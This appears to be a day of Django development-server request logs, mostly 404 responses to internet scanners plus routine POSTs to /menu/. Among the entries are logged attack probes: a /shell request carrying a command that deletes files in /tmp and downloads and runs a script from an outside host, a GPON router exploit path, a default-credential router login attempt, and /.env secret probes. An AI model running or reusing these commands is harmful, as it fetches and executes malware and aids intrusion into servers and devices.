+[13/May/2022 00:00:56] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /favicon.ico
+[13/May/2022 00:01:06] "GET /favicon.ico HTTP/1.1" 404 2228
+Not Found: /
+[13/May/2022 00:01:19] "GET / HTTP/1.1" 404 2177
+[13/May/2022 00:01:34] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ò\x01\x00\x00Î\x03\x03\x8f\x18Bò\x9c\x81rÅ§)õ\x8b<¯\x87·®\'"6u$ðÝùXéÇtMÊL\x00\x00bÀ0À,À/À+\x00\x9f\x00\x9eÀ2À.À1À-\x00¥\x00¡\x00¤\x00')
+[13/May/2022 00:01:34] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[13/May/2022 00:01:38] "GET / HTTP/1.1" 404 2177
+[13/May/2022 00:23:23,401] - Broken pipe from ('20.239.173.152', 64206)
+
+Not Found: /robots.txt
+[13/May/2022 00:23:23] "HEAD /robots.txt HTTP/1.0" 404 2237
+Not Found: /
+[13/May/2022 01:33:41] "GET / HTTP/1.1" 404 2188
+[13/May/2022 01:33:41,572] - Broken pipe from ('112.46.68.30', 48025)
+
+[13/May/2022 01:40:49] code 400, message Bad request syntax ('MGLNDD_118.67.132.87_80')
+[13/May/2022 01:40:49] "MGLNDD_118.67.132.87_80" 400 -
+Not Found: /
+[13/May/2022 01:43:07] "HEAD / HTTP/1.0" 404 2189
+Not Found: /
+[13/May/2022 02:02:27] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[13/May/2022 02:10:27] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[13/May/2022 02:24:44] "GET / HTTP/1.1" 404 2177
+Not Found: /stalker_portal/c/version.js
+[13/May/2022 02:37:11] "GET /stalker_portal/c/version.js HTTP/1.1" 404 2276
+Not Found: /GponForm/diag_Form
+[13/May/2022 02:42:23] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 2257
+[13/May/2022 02:42:24,034] - Broken pipe from ('182.142.99.203', 26156)
+
+[13/May/2022 03:53:20] "POST /menu/ HTTP/1.1" 200 345
+[13/May/2022 03:53:35] "POST /menu/ HTTP/1.1" 200 28
+[13/May/2022 03:53:42] "POST /menu/ HTTP/1.1" 200 291
+[13/May/2022 03:53:50] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[13/May/2022 05:12:12] "HEAD / HTTP/1.0" 404 2189
+[13/May/2022 05:30:27] "POST /menu/ HTTP/1.1" 200 209
+[13/May/2022 05:30:33] "POST /menu/ HTTP/1.1" 200 410
+[13/May/2022 05:30:44] "POST /menu/ HTTP/1.1" 200 28
+[13/May/2022 05:30:51] "POST /menu/ HTTP/1.1" 200 28
+[13/May/2022 05:30:55] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[13/May/2022 05:44:20] "GET / HTTP/1.1" 404 2177
+[13/May/2022 05:50:14] "POST /menu/ HTTP/1.1" 200 410
+[13/May/2022 05:50:18] "POST /menu/ HTTP/1.1" 200 273
+Not Found: /
+[13/May/2022 06:53:39] "HEAD / HTTP/1.0" 404 2189
+Not Found: /
+[13/May/2022 07:08:44] "GET / HTTP/1.1" 404 2177
+Not Found: /showLogin.cc
+[13/May/2022 07:08:44] "GET /showLogin.cc HTTP/1.1" 404 2231
+Not Found: /hudson
+[13/May/2022 08:13:58] "GET /hudson HTTP/1.1" 404 2213
+[13/May/2022 08:42:44] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /portal/redlion
+[13/May/2022 09:53:45] "GET /portal/redlion HTTP/1.1" 404 2237
+Not Found: /actuator/health
+[13/May/2022 10:05:27] "GET /actuator/health HTTP/1.1" 404 2240
+Not Found: /
+[13/May/2022 10:08:54] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[13/May/2022 10:43:52] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[13/May/2022 11:01:58] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[13/May/2022 11:15:04] "GET / HTTP/1.0" 404 2177
+[13/May/2022 11:15:04,701] - Broken pipe from ('156.155.105.250', 6755)
+
+Not Found: /
+[13/May/2022 11:20:16] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[13/May/2022 12:00:54] "GET / HTTP/1.1" 404 2177
+[13/May/2022 12:05:50,110] - Broken pipe from ('20.239.173.152', 53594)
+
+Not Found: /robots.txt
+[13/May/2022 12:06:02] "HEAD /robots.txt HTTP/1.0" 404 2237
+Not Found: /
+[13/May/2022 12:14:21] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[13/May/2022 13:21:19] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[13/May/2022 13:21:41] "HEAD / HTTP/1.1" 404 2178
+Not Found: /
+[13/May/2022 13:29:39] "POST /menu/ HTTP/1.1" 200 345
+Not Found: /pv/spa122.cfg
+[13/May/2022 13:32:14] "GET /pv/spa122.cfg HTTP/1.1" 404 2234
+[13/May/2022 13:32:21,644] - Broken pipe from ('20.239.173.152', 56628)
+
+Not Found: /
+[13/May/2022 14:29:46] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[13/May/2022 15:03:43] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[13/May/2022 15:11:35] "GET / HTTP/1.1" 404 2177
+Not Found: /shell
+[13/May/2022 15:45:28] "GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1" 404 2269
+[13/May/2022 15:45:29,362] - Broken pipe from ('197.36.252.250', 33068)
+
+Not Found: /.env
+[13/May/2022 16:00:41] "GET /.env HTTP/1.1" 404 2207
+[13/May/2022 16:00:41] code 400, message Bad request version ('M>}{¨csd\x80½ÎþèÁ\x95Ä±_\x9f8\x18\x17J×\x0e]¡¶\x01pk6\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+[13/May/2022 16:00:41] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /ab2g
+[13/May/2022 16:19:51] "GET /ab2g HTTP/1.1" 404 2218
+Not Found: /ab2h
+[13/May/2022 16:20:01] "GET /ab2h HTTP/1.1" 404 2218
+Not Found: /
+[13/May/2022 16:45:26] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[13/May/2022 17:01:20] "GET / HTTP/1.1" 404 2177
+[13/May/2022 17:01:20,626] - Broken pipe from ('84.85.158.111', 54930)
+
+Not Found: /
+[13/May/2022 18:23:41] "GET / HTTP/1.1" 404 2177
+Not Found: /.env
+[13/May/2022 19:51:58] "GET /.env HTTP/1.1" 404 2207
+[13/May/2022 19:51:58] code 400, message Bad request version (':¯Y\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+[13/May/2022 19:51:58] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[13/May/2022 19:55:32] "GET / HTTP/1.1" 404 2180
+[13/May/2022 20:07:37,518] - Broken pipe from ('167.94.146.59', 60486)
+
+Not Found: /
+[13/May/2022 20:07:38] "GET / HTTP/1.1" 404 2180
+[13/May/2022 20:07:39,071] - Broken pipe from ('167.94.146.59', 40996)
+
+Not Found: /
+[13/May/2022 20:07:39] "GET / HTTP/1.1" 404 2177
+[13/May/2022 20:07:40] code 505, message Invalid HTTP version (2.0)
+[13/May/2022 20:07:40] "PRI * HTTP/2.0" 505 -
+Not Found: /
+[13/May/2022 21:02:26] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[13/May/2022 21:06:16] "GET / HTTP/1.1" 404 2188
+[13/May/2022 21:06:16,687] - Broken pipe from ('170.254.161.237', 53858)
+
+Not Found: /
+[13/May/2022 22:10:57] "GET / HTTP/1.1" 404 2177
+Not Found: /Public/home/js/check.js
+[13/May/2022 22:10:58] "GET /Public/home/js/check.js HTTP/1.1" 404 2264
+[13/May/2022 22:26:54] "POST /menu/ HTTP/1.1" 200 225
+[13/May/2022 22:27:11] "POST /menu/ HTTP/1.1" 200 195
+Not Found: /boaform/admin/formLogin
+[14/May/2022 00:32:36] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 2302
+Not Found: /
+[14/May/2022 00:52:35] "GET / HTTP/1.0" 404 2188
+[14/May/2022 01:48:28] "POST /menu/ HTTP/1.1" 200 28
+[14/May/2022 01:48:35] "POST /menu/ HTTP/1.1" 200 28
